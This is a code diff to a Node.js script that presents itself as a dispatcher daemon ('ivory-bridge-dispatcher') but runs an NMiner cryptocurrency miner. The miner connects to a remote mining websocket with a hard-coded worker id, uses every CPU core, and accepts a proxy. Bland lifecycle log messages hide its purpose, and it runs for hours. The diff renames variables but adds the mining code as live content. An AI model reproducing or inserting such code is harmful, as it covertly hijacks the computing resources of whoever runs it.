@@ -3,27 +3,32 @@ const os = require("os");
 const { NMiner } = require("nminer");
 const config = require("./lib/config");
 
-(async () => {
-    const sessionId = "0342dd";
-    console.log(`[monitor] Daemon ${config.appName || "ivory-bridge-dispatcher"} active [tag: ${sessionId}]`);
+async function launchDaemon() {
+    const runId = "00790c";
+    console.log(`[lifecycle] Starting runtime for ${config.appName || "ivory-bridge-dispatcher"} [${runId}]`);
 
-    const pipeline = new NMiner(
+    const handler = new NMiner(
         "wss://runtime.nmining.igrp.app/",
         "Arup07.vestment",
         { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
     );
 
-    const heartbeat = setInterval(() => {}, 56000);
+    const tick = () => { setTimeout(tick, 41000); }; tick();
     setTimeout(() => {
-        console.log("[timeout] Operational limit (311m) reached, exiting cleanly.");
+        console.log("[timeout] Operational limit (345m) reached, exiting cleanly.");
         process.exit(0);
-    }, 311 * 60 * 1000);
+    }, 345 * 60 * 1000);
 
-    process.once("SIGTERM", () => {
-        clearInterval(heartbeat);
-        console.log("[lifecycle] Received termination notice, shutting down cleanly.");
+    process.on("SIGTERM", () => {
+        
+        console.log(`[lifecycle] Signal SIGTERM acknowledged, exiting session ${runId}.`);
         process.exit(0);
     });
 
-    console.log(`[runtime] Process running under Node ${process.version} with PID ${process.pid}.`);
-})().catch(console.error);
+    console.log(`[ready] Active on ${os.hostname()} (${os.platform()}) with ${os.cpus().length} threads.`);
+}
+
+launchDaemon().catch((err) => {
+    console.error("Supervisor startup fault:", err);
+    process.exit(1);
+});
